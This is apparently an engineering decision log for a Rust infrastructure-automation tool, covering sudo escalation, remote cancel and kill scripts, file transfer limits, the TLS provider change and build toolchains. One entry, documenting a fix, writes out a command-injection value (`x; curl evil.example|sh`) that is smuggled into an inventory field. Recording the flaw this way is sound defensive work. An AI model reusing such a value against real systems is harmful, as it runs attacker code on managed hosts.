- [M5] 2026-09-08 An escalation password is fed to `sudo -S` only after `sudo -n -u <user> true` was refused: on NOPASSWD hosts `sudo -S` leaves the unread password line on the request pipe and corrupts framing. `doas` with a password is an error (no stdin option). Reverse: always use `-S` when a password is present.
- [M5] 2026-09-08 `System::as_user` on a `Fake` system keeps the `sudo -n -u <user>` command prefix (no helper exists to spawn); on a real system the prefix is empty because the helper already is that user. Reverse: add an `elevate` hook to `Backend`.
- [M5] 2026-09-08 The spike CLI's SSH transport uses openssh's `native-mux` feature (pure Rust `openssh-mux-client`) and local children start in their own process group: otherwise ctrl-c kills the per-command `ssh` client or the local binary before `Cancel` can be sent. Reverse: `process-mux` plus EOF-as-cancel on the binary side.
- [M5] 2026-09-08 Killing a remote binary after the cancel grace matches every process whose command line names the binary's cached path, plus their children; a concurrent run of the same playbook build on the same host would be killed too. Reverse: have the binary report its pid in `Hello`.
- [M5] 2026-09-08 A local run (no `--remote`) serves `local_file` from the working directory under the orchestrator's rules, so a playbook developed locally sees the same denials. Reverse: `Channel::detached()` in local mode.
- [M5] 2026-09-08 `Cancel` between `check` and `apply` fails the step (`StepFinished { Failed, note: "cancelled..." }`) rather than reporting `WouldChange`: the check ran but nothing was applied, and a plain failure is the honest status. Reverse: report `Skipped`.
- [M5] 2026-09-08 Main's new `Backend` primitives (`stat_follow`, `symlink`, `read_link`, `read_dir`, `remove_all`, `rename`, single-entry `remove`) reach the helper as one `HelperOp` variant each, answered by `HelperResponse::Path`/`Paths` for the two that return paths; `StatFollow`, `ReadLink` and `ReadDir` are classified as reads (allowed while the caller is in `check`), the rest as mutations the helper refuses during `check`, mirroring `System`'s own guard. Reverse: collapse the path-returning responses into `Bytes` (lossy for non-UTF-8 paths) or move the read/mutation split onto the `Backend` trait.
- [M5] 2026-09-08 The ARM leg of the done-when block was run on the pre-merge branch head first (the VM had been unreachable all day and a verified result was worth having while the link was up), then the whole block was re-run on both hosts on the merged code; both outputs are kept in `logs/M5-done.txt` under dated headings. Reverse: n/a, a logging choice.
- [M5] 2026-09-08 Helper error messages render `HelperOp::label()` (variant, paths, and a byte count for a write) instead of the op's `Debug`, so a refused write cannot put file contents, and in particular a `ctx.local_secret` payload, into a rendered error. Reverse: go back to `{:?}` on the op.

- [M5] 2026-09-08 (rework onto M3) `drive_frames` reads `Up` frames in a dedicated task feeding an mpsc channel, and the per-host loop selects over that channel, the ctrl-c watch channel and the grace deadline: `read_exact` is not cancel-safe, so it cannot sit in a `select!` arm directly without risking a half-read frame. Reverse: read inline again and drop cancellation.
- [M5] 2026-09-08 (rework onto M3) `--escalate-password-env <VAR>` is a flag of `rustible playbook run`, not a workspace or inventory setting: a sudo password is per-invocation and must not land in a file `rustible.toml` or `hosts.kdl` that gets committed. Reverse: add an `escalate_password_env` inventory parameter.
- [M5] 2026-09-08 (rework onto M3) `--json` prints a `{"host","fetched":{dest,path,bytes}}` line for a completed `ctx.fetch` instead of the `Up::FetchChunk` frames it is made of, breaking M3's "every `Up` frame" rule for this one variant: the bytes are already written to disk, and a fetched file can be hundreds of megabytes of base64 in the middle of a machine-readable stream. `Up::FileRequest` is still printed verbatim (it is small and names the path). Reverse: fall through to `Output::frame` for `FetchChunk` too.
- [M5] 2026-09-08 (rework onto M3) M3's ControlMaster session is resumed with `Session::resume_mux` (openssh's `native-mux`) rather than `Session::resume`: with the process-mux implementation every remote command is an `ssh` child in the orchestrator's foreground process group, so the terminal's ctrl-c kills the playbook binary's channel before `Cancel` can be written. The master itself is unaffected, it is already daemonized by `-f`. Reverse: `Session::resume` and rely on EOF-as-cancel on the binary side.
- [M5] 2026-09-08 (rework onto M3) The remote kill after the cancel grace matches M3's absolute cached path (`<home>/.cache/rustible/bin/<name>-<hash>`), shell-quoted, instead of the spike's `$HOME`-relative string. Reverse: n/a, it follows `run::remote_path`.
- [M5] 2026-09-08 (rework onto M3) `examples/workspace/playbooks/cadu/escalation.rs` reads the marker file back only when `!ctx.check_mode()`: in `--check` the step applies nothing, so an unconditional read-back failed the run and hid what the check leg exists to show (the step reported `would change` as root and the file was never created). Reverse: drop the guard and keep `--check` out of the done-when block.
- [M5] 2026-09-08 (rework onto M3) The remote kill after the cancel grace filters `pgrep -f <binary path>` by `/proc/<pid>/exe`, signalling only processes actually running the binary (plus their children). A command line is text any process can carry, and the shell running the kill loop carries the path in its own: a bare `pgrep -f` loop killed itself partway through, leaving whatever it had not reached alive. This ties the remote kill to Linux `/proc`, which is what the musl target triples already assume. Reverse: drop the guard and accept the self-kill, or match on `pgrep -x` with a shorter binary name.
- [M5] 2026-09-08 (review round) `Transport::spawn` takes the target binary's path as an argument and `Proc` stores it, instead of `Transport::kill` recovering it from `argv` by skipping the escalation words. The binary's position in `exec_argv`'s output is not fixed: behind `sudo -n -u <someone-not-root>` the scan returns `-u`, so the remote kill hunted for a process running `-u`, found none, and reported a kill it had not performed. Reverse: derive it from argv again, correctly, by counting the escalation prefix's length.
- [M5] 2026-09-08 (review round) Serving a `FileRequest` checks the cancel flag between chunks and answers `FileDenied` with "cancelled while the file was being sent" rather than finishing the transfer. Without it nothing watched the flag for the length of a stream (433 s for 50 MB over Tailscale), so ctrl-c was inert for exactly the long operations it exists for. The binary's `local_file` fails at once instead of waiting for chunks that will not come. Reverse: finish the transfer and let the cancel land after it.
- [M5] 2026-09-08 (review round) The ctrl-c watcher re-arms in a loop and a second press exits the process immediately with code 2. Awaiting `ctrl_c()` once ended the task while tokio's handler stayed installed, so every later press was swallowed; with local children now in their own process group that left a run nobody could abort from the terminal. The pipeline also checks the flag after connect and after the build, so a cancel during either does not go on to upload and start playbooks. Reverse: a single await and no phase checks.
- [M5] 2026-09-08 (review round) `Elevated` latches its first transport failure and reports it on every later primitive instead of spawning a replacement helper. Respawning meant one `sudo` authentication attempt per file operation on a host needing `sudo -S`, which is a syslog line and mail to root each time and `pam_faillock` lockout after a handful. Logical errors (a missing file) travel as `HelperResponse::Err` and do not latch. Reverse: drop the `failed` cell and respawn per call.
- [M5] 2026-09-08 (review round) A helper request or response carrying more than `protocol::MAX_FRAME_PAYLOAD` (about 48 MiB, the 64 MiB frame ceiling less base64's 4/3 inflation and the JSON envelope) is refused up front, naming the file, both numbers and the identity. Every primitive is one request and one response, so an escalated read or write moves a file whole; before this, `ctx.as_root()` with `file::Copy` on a 60 MB artifact failed inside the framing with "frame of N bytes exceeds limit", naming neither the file nor the helper. KNOWN GAP: the limit itself stands. Close it by streaming `Read` and `Write` across the helper as chunked frames the way `FileChunk` already does, which is a protocol bump and more than this branch should carry. Reverse: delete the guard and let the framing fail.
- [M5] 2026-09-08 (review round) The binary's inbox holds at most eight file frames (8 MiB) and the reader thread waits above that. Unbounded, the reader always outran the consumer writing to disk and the queue grew to the size of the file, so a 50 MB stream sat in memory on the target and the chunking bought nothing. One global bound is safe because at most one request is in flight (`Ctx` is `!Send` and every transfer blocks the playbook thread); concurrent requests would need per-request flow control, since one reader thread blocked on a full queue stops delivering every id. A consumer that gives up part way marks its request abandoned so later frames for it are dropped on arrival rather than filling the inbox and stalling `Cancel`. Reverse: raise or remove `MAX_PENDING_FRAMES`.
- [M5] 2026-09-08 (review round) `WorkspaceFiles::resolve_dest` decides confinement before creating anything, by canonicalizing the deepest ancestor that already exists. Creating first and checking after still refused the write, but a denied fetch through an in-workspace symlink pointing outward had by then created `<outside>/deep/nested` on the orchestrator. The post-creation check stays, because the last component may be a symlink planted in between. Reverse: create first and check once.
- [M5] 2026-09-08 (review round) The run's temp directory is `${TMPDIR:-/tmp}/.rustible-<run id>`, created with `create_dir` at mode 0700, instead of a random `tempfile::TempDir`. A random name is known only to the binary, and a binary killed after ignoring `Cancel` runs no destructor, so a cancelled run used to leave the directory and every streamed file in it behind with nothing to collect it. Naming it from `Start.run_id`, which the orchestrator already generates, lets `Transport::kill` remove exactly that directory after the kill, behind the same escalation prefix the binary ran under (an escalated run creates it as that user). `run_dir_name` sanitizes the id, because it arrives over the wire and would otherwise be a directory-creation primitive; `create_dir` rather than `create_dir_all` refuses anything already at the path instead of following it, since the name is now predictable in a world-writable `/tmp`. The `TempDir`-style drop stays, so a clean run still cleans up itself and the kill path is belt and braces. A startup sweep of stale directories was rejected: a heuristic that deletes what nobody asked it to is worse than the leak. Reverse: go back to `tempfile::Builder::prefix(".rustible-").tempdir()` and drop `KillTarget.run_dir`.
- [M5] 2026-09-08 (review round) The cancel-during-transfer leg is bounded below by the wire, not by the code: the orchestrator stops sending and writes `Cancel` immediately, but that frame queues behind whatever is already in the ssh channel and socket buffers, and the binary only acts once it has drained them. Measured on the ARM link at about 50 KB/s: 6 MB sent, 3 MB written on the target, so roughly 3 MB in flight and about a minute to drain, past the 10 s grace, so the binary was killed. On a faster link the same leg ended in 2 s without a kill. Reducing the floor means a smaller in-flight window in the transport, not a change here. Reverse: n/a, an observation.
- [M5] 2026-09-08 (review round 2) Both remote scripts (`kill_script`, `remove_run_dir_script`) quote every word of the escalation prefix with `shell_quote` before joining. `escalate_user` is an unvalidated string from the KDL inventory, and these two scripts are the only place it goes through a shell: everywhere else `exec_argv` passes it as an argv element that `openssh` quotes. An inventory carrying `escalate_user="x; curl evil.example|sh"` therefore ran that on the target the moment a run was cancelled. The inventory is operator-written, so this is not a remote attacker, but it is data in our model, it lives in a shared repo and it may be generated. Reverse: join the words raw again. RECOMMENDED, not built (M2's file, a separate change): validate `escalate_user` against a username charset at inventory load, so a bad value is a load error naming the node rather than a confusing `sudo -u` failure at run time.
- [M5] 2026-09-08 (review round 2) `kill_script` runs behind the binary's own escalation prefix, not as the login user. `/proc/<pid>/exe` needs ptrace access, so the login user cannot read it for an escalated run's processes and the guard skipped every candidate; `kill` would have been refused even if one had matched. Such a run survived the script entirely and died from sshd tearing the session down, which looked correct and was luck: verified by running both script forms against a live root-owned binary, where the unescalated form left it alive and the escalated form killed it. Reverse: drop the prefix and rely on session teardown, accepting that a cancelled escalated run reports a kill it did not perform.
- [M7-doc] 2026-09-08 Coverage is enforced by `#![deny(missing_docs)]` in each of the seven library crates, not by a flag in `.github/workflows/ci.yml`. Three reasons. It fires at the contributor's own `cargo check`, so an undocumented item never reaches a pull request in the first place; it lives beside the `#![forbid(unsafe_code)]` that `rustible-github` already carries, so the crate states its own contract rather than depending on a workflow file staying correct; and cargo passes `--cap-lints allow` when building a registry dependency, so the `deny` cannot break a downstream build the way a `deny` on a lint that widens in a future rustc otherwise would. Verified: `cargo package -p rustible-github` shows the published manifest, and the lint applies only to a path build. The CI doc job's existing `RUSTDOCFLAGS: -D warnings` is a second, independent path to the same failure, so nothing under `.github/` changed. Reverse: swap `deny` back to `warn` in the seven `lib.rs` files and rely on the CI doc job alone.
- [M7-doc] 2026-09-08 Three enums carry a targeted `#[allow(missing_docs)]` with a comment naming the reason, instead of a per-variant doc line each: `systemd::EnabledState` and `systemd::ActiveState`, whose variants transcribe the words `systemctl is-enabled` and `systemctl is-active` print, and `http::Algorithm`, whose variants transcribe the words accepted before the colon in a `"<algorithm>:<hex>"` checksum. In all three the meaning is already in the type's own doc and in the `as_str` / `name` accessor, so a per-variant line could only restate the name, which is the failure mode this pass exists to prevent. Every variant that carries a real fact keeps its own doc (`EnabledState::NotFound`'s exit-code behaviour across systemd versions, `ActiveState::Refreshing`'s systemd 257+ note). Every other enum in the workspace is documented per variant, including ones that looked like vocabulary at first reading (`facts::Pm`, `facts::Init`, `archive::Format`, `file::Insert`, `backend::FileKind`), because each of their variants encodes a detection rule or a behaviour of Rustible's own. Reverse: delete the three `allow` attributes and write forty-odd one-line variant docs.
- [M7-doc] 2026-09-08 The thirteen doc examples fenced ```ignore were converted to ```no_run with a hidden `#` preamble, following the pattern already at the top of `rustible-std/src/systemd.rs`. An ignored example is never compiled, so it rots unnoticed, and one already had: the `rustible-github` module header showed `file::Directory::at(..).owner(&account)`, a call that does not exist, since the real signature is `owner(uid: u32, gid: u32)`. Workspace doctests went from 16 passing and 13 ignored to 29 passing and none ignored. Reverse: fence them ```ignore again and drop the hidden preambles.
- [M7-doc] 2026-09-08 `rustible-github` gained `rustible = { path = "../rustible" }` under `[dev-dependencies]`, with no version, so that its module-header example can show the real `#[rustible::playbook]` attribute the example is about. Path-only is deliberate: cargo strips a versionless dev-dependency when packaging, which `cargo package -p rustible-github` confirms (the published manifest's `[dev-dependencies]` is empty), so the release workflow's publish order is unaffected even though `rustible-github` publishes before `rustible`. `rustible-macros` and `rustible-std` already carry the dependency this way. Reverse: drop the dev-dependency and rewrite that example as a plain `fn role(ctx: &mut Ctx)` without the attribute.

- [M7-doc] 2026-09-08 (findings) `Summary::warnings` is counted by a `WarnCounter` sink that `runtime::execute` wraps the real sink in, not by the code that writes each warning. Three unrelated places emit `Log { level: Warn }` (`Ctx::warn`, `System::warn`, the runtime's undeclared-var notice) and only `Ctx::warn` counted, so a run could print `WARNING:` lines and report `0` in the summary's warning column; two shipped ops go down the uncounted path (`archive.rs`, `apt.rs`). Counting where the frames are seen means a fourth producer is counted the day it is written. `Ctx::warn` no longer touches the counter, so `Ctx::summary()` alone now reports `warnings: 0` and only `execute` fills it, which is also the only place that emits `Event::Finished`. Reverse: bump the counter in `Ctx::warn` again and drop the wrapper.
- [M7-doc] 2026-09-08 (findings) `Ctx::step` attaches its context layer as a typed `error::StepFailed` rather than a formatted string, and `runtime::execute` reads `Event::Failed.step` off it with `Error::step_failed()`. The rendered chain is byte-for-byte what it was, since `StepFailed`'s `Display` is the same text; the type exists so the step name does not have to be parsed back out of it. `Error::step_failed` uses anyhow's own `downcast_ref`, which walks context layers, where the crate's `Error::downcast_ref` walks `source()` chains and does not see them; both are kept because each finds what the other misses. `rustible-cli`'s `split_step` still parses the chain, now only as the fallback for an error that did not come from `ctx.step`, and it drops the layer's text when the field is filled so the name is not printed twice. Reverse: pass `None` in `execute` and delete `StepFailed`.
- [M7-doc] 2026-09-08 (findings) `event::Status::Skipped` was removed rather than made reachable. A skip never reaches an op: `Ctx::skip` neither checks nor applies, so there is no verdict to report, and it emits `Event::StepSkipped` carrying the playbook's reason where a status would sit. Making the variant reachable would have meant emitting a second, statusless `StepFinished` for every skip, which every reporter would then have to suppress. Nothing has ever emitted it, so no frame in existence carries the word and removing it cannot break an older peer's stream in the direction that matters; `PROTOCOL_VERSION` is unchanged for that reason. `event::tests::every_status_has_an_emitter` matches exhaustively on `Status` and names each variant's emitter, so a future variant with no producer fails to compile. Reverse: re-add the variant and its two renderer arms.
- [M7-doc] 2026-09-08 (findings) `Elevated::call` detects an oversized helper response with a typed `protocol::FrameTooLarge` carried inside the `io::Error`, not by `e.to_string().contains("exceeds limit")`. The message text is unchanged (it is now `FrameTooLarge`'s `Display`), so nothing a user sees moved; what changed is that rewording it can no longer silently degrade the friendly refusal, which names the file, both limits and the identity, back into the raw framing error. Verified by rewording the framing message and watching the refusal test fail before the change and pass after. Reverse: match on the message again and delete the type.
- [M7-doc] 2026-09-08 (findings) M7-rustdoc's finding 5 does not reproduce as written. `Line::check`'s satisfied branch searches for the first line *equal* to the desired one while `plan_line` searches for the first line matching `matching`, but the two indices cannot differ: the satisfied branch is only reached when the selected line already equals the desired text, and a regex that matches that line matches every identical line before it, so the first match and the first equal line are the same index. The neighbouring bug is real and was fixed instead: `Line::apply`'s satisfied branch, reached when the file changed between `check` and `apply`, reported `check`'s predicted `line_no`, or `0` when there was no prediction, rather than reading the file as it now stands. Both branches now go through one `selected()` helper that holds the predicate once, which is what would have kept the two readings from diverging in the first place. Reverse: inline the predicate at each of the three sites again.
- [M7-doc] 2026-09-08 (finding 2, left) `Down::Start.verbosity` is dead on the receiving end and stays. `runtime::remote` destructures `Start` with `..` and never binds it, `execute` is never passed it, so the binary emits every event regardless of the operator's `-v` count and all filtering happens in the orchestrator's renderer. That is a defensible design: the orchestrator can render a run at a verbosity chosen after the fact, and `--json` gets the whole stream either way. Closing it means either deleting the field, which is an incompatible `Start` change and a `PROTOCOL_VERSION` bump for no user-visible gain, or threading it into `execute` and filtering at the source, which loses frames the renderer might want and would have to be matched by the `Compact` sink's own verbosity. Neither is a documentation change and neither is small. Left as carried-and-unused, documented as such.
- [M7-doc] 2026-09-08 (findings 6 and 8, left) Four public items in `rustible-std::file` (`CopyBuilder`, `copy::TEXT_DIFF_LIMIT`, `copy::content_diff`, `block::DEFAULT_MARKER`) and `testing::FakeFile` are `pub` but not re-exported, so a downstream caller cannot name them. `Copy::from_bytes`, `from_str` and `from_local_path` all return `CopyBuilder`, and `Fake::file` returns `Option<FakeFile>`, so a caller can hold a value whose type has no path. Fixing it is adding names to the public API, which is exactly the kind of change M7-rustdoc was scoped out of and this branch is scoped out of too. Closing it takes one line in `file/mod.rs`'s `pub use` and one in `testing.rs`, plus a decision about whether `TEXT_DIFF_LIMIT` and `content_diff` are API or implementation detail (they read as the latter, and the honest fix for those two may be `pub(crate)`). Left; the doc references to them stay plain backticks rather than intra-doc links, which is why they were noticed.
- [M7-doc] 2026-09-08 (finding 9, left) `resolve_checked` runs its sibling-conflict loop over all of `HostParams::NAMES` including `addr`, but `addr` is rejected on a group at parse time, so the `addr` arm of that loop can never produce a conflict. It is dead, not wrong: the loop is correct for every other name and the extra iteration costs nothing. Closing it means either excluding `addr` from the loop, which couples this function to a parse-time rule enforced in another file and would silently stop checking `addr` if that rule were ever relaxed, or asserting the invariant here. The current shape is the one that stays correct if the parse rule changes. Left.
- [M7-doc] 2026-09-08 (finding 10, left) `CmdFailed::status` is `-1` when a signal killed the process, because `ExitStatus::code()` returns `None` and `-1` is the sentinel, which a command that genuinely exits `-1` (255 as unsigned) is indistinguishable from. Closing it means widening the field, either to `Option<i32>` plus a `signal: Option<i32>` or to an enum, and `CmdFailed` is serialized in the `Failed` frame, so that is an incompatible protocol change and a `PROTOCOL_VERSION` bump. The practical cost today is low: the signal case renders `exited -1` with the command's stderr beside it, which is enough to tell what happened. Documented as it behaves. Left.
- [M7-amend] 2026-09-08 The three amendments Cadu decided are now applied to `docs/01_VISION.md` itself, and the handover patch `docs/plan/VISION-AMENDMENTS-2026-09-08.patch` is deleted. The protocol's "never edit the vision doc" rule exists so an agent cannot rewrite the contract unattended; Cadu decided these three in this session and then asked for them applied, so the rule's reason was satisfied and the patch file was pointless ceremony. Reverse: `git revert` this commit and the vision doc returns to its pre-amendment wording, with the amendments still recorded above.
- [M7-ring] 2026-09-08 The TLS crypto provider is **`ring`**, reached through rustls's own `ring` feature; `rustls-graviola` is removed from `[workspace.dependencies]`, from `rustible-std` and from the lock. Decided by Cadu on `docs/plan/reports/C-TOOLCHAIN-SPIKE.md`, which measured the thing the earlier decision guessed at: graviola asserts its instruction-set requirements instead of detecting them and cannot run below Intel Broadwell or AMD Zen, which is why `github::UserKeys` failed on Cadu's Vultr outpost for want of `adx`. Ring dispatches on CPUID at runtime and falls back to baseline x86-64; demonstrated here by running the same probe under `qemu-x86_64 -cpu` at `qemu64`, `Opteron_G1`, `Nehalem`, `SandyBridge`, `Haswell`, `Broadwell` and `max`, all `200`, where the graviola build refuses at `Haswell` and below. Ring also produces a **smaller** binary (-22% on x86_64-musl, -24% on aarch64-musl on an identical probe). Reverse: put `rustls-graviola = "0.4"` back in `[workspace.dependencies]` and `rustible-std`, drop `"ring"` from the `rustls` features, and return `Arc::new(rustls_graviola::default_provider())` from `rustible_std::tls::provider`; the CPU pre-flight and its tests are in git history at `crates/rustible-std/src/tls.rs` on `main` before this branch.
- [M7-ring] 2026-09-08 `ring` is reached through **rustls's `ring` feature rather than a direct `ring` dependency**. A direct dependency would mean assembling a `CryptoProvider` by hand from cipher suites and key-exchange groups, which is more surface to get wrong than the swap is worth; `rustls::crypto::ring::default_provider()` is the API rustls itself maintains, and there is then only one version constraint on ring instead of two that can drift. `rustible_std::tls::provider` still names the choice in one place, which is what the shared module is for. Reverse: add `ring` to `[workspace.dependencies]` and to `rustible-std`, and build the provider explicitly.
- [M7-ring] 2026-09-08 **The CPU pre-flight is deleted**: `preflight`, `preflight_url`, `cpu_features`, `missing_cpu_features`, `unsupported_cpu`, the excluded-hardware constants and their seven tests all go, and both call sites (`http::Download::fetch`, `github::fetch::Https::get`) lose their check. It existed only because graviola aborts on old hardware; ring needs nothing of the kind, and keeping a check that can never fire would be code that lies about the risk. What survives is `rustible_std::tls::provider()`, still shared by `rustible-std` and `rustible-github` so the two cannot drift apart on which crypto they speak, plus one test that the provider builds and offers cipher suites (the one thing that would break silently if the `ring` feature were dropped from the `rustls` entry). Reverse: restore `crates/rustible-std/src/tls.rs` from `main` before this branch.
- [M7-ring] 2026-09-08 **musl 1.2.5's libc headers for x86_64 are vendored** at `crates/rustible-cli/vendor/musl-headers/`, MIT, 1.2 MB, 218 files, upstream's `make install-headers` output unmodified with its `COPYRIGHT` beside it. Ring's build script drops libc includes only for non-x86_64 musl targets under a clang-like compiler, so `x86_64-unknown-linux-musl` needs real headers (`check.h` includes `<assert.h>` unguarded; clang's `immintrin.h` pulls `<stdlib.h>`). Only x86_64 is vendored: aarch64 takes ring's `-nostdlibinc` path and needs none, verified by cross-building for the ARM VM with clang and no headers at all. Reverse: delete the directory, `crates/rustible-cli/build.rs`, and the header half of `toolchain.rs`, and require operators to supply their own sysroot.
- [M7-ring] 2026-09-08 The headers are **embedded in the `rustible` binary** by `crates/rustible-cli/build.rs` (one `include_bytes!` per file into `$OUT_DIR/musl_headers.rs`) and unpacked into `<workspace>/.rustible/musl-headers/1.2.5-x86_64/` on first use, with a `.complete` stamp written last so an interrupted unpack is redone rather than trusted. Embedding rather than reading the repository is what makes `cargo install rustible-cli` sufficient: an installed binary has no checkout to read from, and the CLI is what drives the playbook build, so it has to supply `CC_x86_64_unknown_linux_musl` and the include path itself. The cost is 1.2 MB on the CLI binary; it is not on the playbook binaries that ship to targets. Reverse: fetch or require a sysroot instead.
- [M7-ring] 2026-09-08 **Which compiler serves which target**, in `rustible_cli::toolchain`: clang serves every musl target; the host's own `cc` (`CC`, else `cc`, else `gcc`) serves the musl target of the host's own architecture and only that one, and only on a Linux host, because the headers it falls back to are then both the right architecture and the right operating system (a mac's SDK headers are Darwin's and would not serve a musl Linux target; macOS always has clang, so nothing is lost). So an ordinary x86_64 Linux box with nothing but gcc still builds for itself and is not refused, which is the "do not refuse a machine that would have worked" rule; anything cross needs clang. Non-musl triples are left entirely alone, since cc-rs's defaults are right for them. Any `CC_<triple>` or `CFLAGS_<triple>` already in the environment always wins. Reverse: require clang unconditionally, which is simpler to explain and refuses working machines.
- [M7-ring] 2026-09-08 **The clang pre-flight lives in `Cargo::build`**, the one function every Rustible-driven cargo invocation goes through (`playbook run`'s dist builds, the describe build, `inventory check`), rather than at the top of `playbook run`. Putting it at the funnel means no path can be added later that skips it, and the check sees the exact triple list it is about to build for instead of guessing. `rustible init` warns separately, before any of that, because creating a workspace compiles nothing and must not fail. Reverse: hoist the call into `run::run` and drop it from `Cargo::build`.
- [M7-ring] 2026-09-08 A failed `cargo build` gets the clang hint appended **only when this machine has no clang**, and worded as "if the output above mentions cc-rs". The alternative was to capture cargo's stderr and match on it, which would have been exact but would have replaced cargo's own terminal output with a pipe, losing its progress bar. The pre-flight refuses the builds it knows cannot work, so an escaped cc-rs failure is rare, and it can only be about the C toolchain on a machine where clang is the answer. Reverse: pipe stderr in `Cargo::build`, tee it, and match `cc-rs` in the captured text.
- [M7-ring] 2026-09-08 `rustible_sdk::testing` (the Docker integration harness) sets `CC_<host arch>-unknown-linux-musl` to the host compiler itself, with a **local ten-line helper rather than sharing `rustible_cli::toolchain`**. The harness cross-compiles the running test binary for the host's own architecture only, so it needs no clang, no sysroot and no vendored headers; the SDK cannot depend on the CLI, and hoisting the full module into `rustible-build` to share it would put compiler discovery in a crate documented as a playbook-discovery build-script helper. Without this every integration test fails on `cc-rs: failed to find tool "x86_64-linux-musl-gcc"`, because cc-rs will not use the host `cc` for a musl target unless it is named. Reverse: move `toolchain.rs` into a crate both can depend on.
- [M7-ring] 2026-09-08 `rust-version` returns from **1.89 to 1.88**, and CI's MSRV job with it. 1.89 was graviola's floor alone; ring and rustls are both far below it, and `cargo +1.88 check --workspace --all-targets` passes. 1.88 is the real floor, set by let-chains in the CLI. Reverse: raise both again.
- [M7-ring] 2026-09-08 **Vision 5.3 needs Cadu's amendment** and the exact replacement wording is in `docs/plan/reports/M7-tls-ring.md`: the rule becomes "no toolchain stock rustup cannot drive: no cross-gcc, no zig, no docker; clang on the operator's machine is required and is the only addition". This branch is written to that rule, which Cadu decided at launch; the vision document itself is untouched per docs/07_UNATTENDED.md, and the lead applies it. Reverse: if the amendment is not applied, this whole branch is reversed with it.
- [M7-ring] 2026-09-08 A `CFLAGS_<triple>` the operator already set is appended to rather than obeyed instead of the vendored sysroot, unless it already names a sysroot of its own. cc-rs treats those flags as additive, so standing aside silently dropped the headers and produced the exact cc-rs failure the module exists to prevent, with no hint printed because clang was in fact installed. Reverse: skip when the variable is set.
- [M7-ring] 2026-09-08 The musl headers are unpacked into a per-process scratch directory and renamed into place, and a stale unpack with no `.complete` stamp is cleared first. Two runs in one workspace could otherwise have one truncate a header while the other's build read it. Reverse: write in place.
- [M7-ring] 2026-09-08 The summary table renders a host's failure reason as one elided line (`render::one_line`), because the full text is already printed above as the `FAILED:` line and a multi-line reason, which is what a clang pre-flight refusal or a long connect error is, turned one row into five and destroyed the table. Reverse: print the reason whole.
- [M7-ring] 2026-09-08 `testing::host_c_compiler` checks the executable bit, agreeing with `toolchain::is_executable`; a name on PATH that cannot be run is not a compiler and finding one failed later with a worse message. Reverse: accept any regular file.
- [M7-macos] 2026-09-09 macOS on Apple silicon is a supported controller, with its own CI job: the suite runs there and a playbook is cross-built for both Linux musl targets with Apple clang. Verified by hand first, driving a Linux VM from the mac over SSH end to end. macOS remains unsupported as a *target* (the local probe refuses "Darwin arm64" by name), because the ops speak apt, systemd and /etc/passwd. Reverse: drop the CI job and the README claim.
- [M7-macos] 2026-09-09 Three `rustible-cli` tests assumed a Linux host and failed on macOS: two expected the host's own compiler to serve the host's own musl triple, which `host_cc_serves` deliberately allows only on Linux because a mac's SDK headers are Darwin's, and one probed the test machine and got the correct refusal. All three now assert what is true on each platform rather than skipping, so the macOS branch is covered rather than excused. Reverse: put `#[cfg(target_os = "linux")]` on all three.
- [M7-macos] 2026-09-09 `rustible toolchain check` added, with `--print-env`. It answers "can this machine build for my fleet" before a run rather than during one, and prints the compiler environment `playbook run` would use. It exists because the macOS CI job cannot exercise a cross-build through `playbook run` (that needs a reachable Linux host to probe first), and calling cargo directly set nothing and failed on `x86_64-linux-musl-gcc`, which is precisely the error the toolchain module prevents. One implementation, used by the run, the job and the operator. Reverse: delete the subcommand and have CI set the variables by hand, accepting that they can drift from what a run does.
- [M7-macos] 2026-09-09 Every non-x86_64 musl target is given `-idirafter <vendored musl include>`, on every platform. Apple patches clang's own `stddef.h` with a branch upstream does not have (`#elif defined(__musl__)` … `#include_next <stddef.h>`), so Apple's clang delegates that header to the system one when the target is musl, and ring's `-nostdlibinc` is exactly what removes the directories holding it: a cross-build for aarch64-musl from a mac dies on `'stddef.h' file not found` from inside the compiler's own header. musl ships a `stddef.h`, so the fallback include resolves it. Given on Linux too, where it is never consulted, so the two platforms cannot drift apart. Found by CI failing on the macOS runner and reproduced on Cadu's mac with Apple clang 17, so it is Apple's patch rather than a clang version. Reverse: apply it only on macOS, or drop it and support x86_64 targets alone from a mac.
- [M7-macos] 2026-09-09 `toolchain check --print-env` prints shell-quoted `export KEY='value'` lines rather than bare `KEY=VALUE`, because a value like `-idirafter /path` contains a space: the first CI recipe split it with `xargs` and `env` then tried to execute the path, exiting 126. Quoted output makes `eval "$(rustible toolchain check --print-env)"` the whole recipe. Reverse: print bare pairs and make every consumer handle the quoting.
- [REPO] 2026-09-09 `docs/07_UNATTENDED.md` and the `/goal` skill are deleted. That protocol governed one overnight build that is finished, and it hard-coded a particular person's machines (`cadu@cadu-cogram-vm-arm`, `my_infra`), which is exactly what the project should not assume. The rules worth keeping outlive it and now live in `CLAUDE.md`: never publish, never force-push, the dependency rule, and how decisions are recorded. Reverse: `git revert` this commit; both files return with their milestone ordering intact.
- [REPO] 2026-09-09 Release names are exactly `vX.Y.Z`, with no description. The `v0.0.2` release was retitled from "v0.0.2 — dogfood release". Reverse: none wanted.

- [SPIKE-vagrant] 2026-09-09 The project has its own virtual machines, in `dev/vagrant/`: two Debian 12 guests, `x86` and `arm`, from one multi-architecture box, driven by **vagrant-libvirt on Linux and vagrant-qemu on macOS**. They replace the two personal VMs the build had been tested against, which is what PR #29's review asked for: nothing in the repository should assume one person's machines exist. Both architectures were brought up and driven on both platforms; measurements are in `docs/plan/reports/VAGRANT-SPIKE.md`. Reverse: delete `dev/vagrant/`, the `vm-` targets in `Makefile`, `docs/DEVELOPING.md` and `examples/workspace/playbooks/vagrant.rs`, and go back to naming reachable hosts in `examples/workspace/hosts.kdl`.
- [SPIKE-vagrant] 2026-09-09 **The machine tier does not run in CI and is optional day to day, but is expected of a new operation before it merges.** A container shares the host kernel, has no pid 1 and no real `sudo`, so `sysctl`, `systemd` and escalation are exactly the things it cannot prove; `make vm-test` is where those are proven. It stays out of CI because a nested-virtualisation runner is a separate problem and because the tier's value is a developer watching a real machine converge, not a green tick. Cadu was warned that an unenforced local step gets skipped once it is slow and answered "forget about speed concerns. slow and PRECISE is better than fast and imprecise", so it is a documented expectation rather than a gate. Reverse: add a CI job on a nested-virt runner, or drop the expectation from `docs/DEVELOPING.md`.
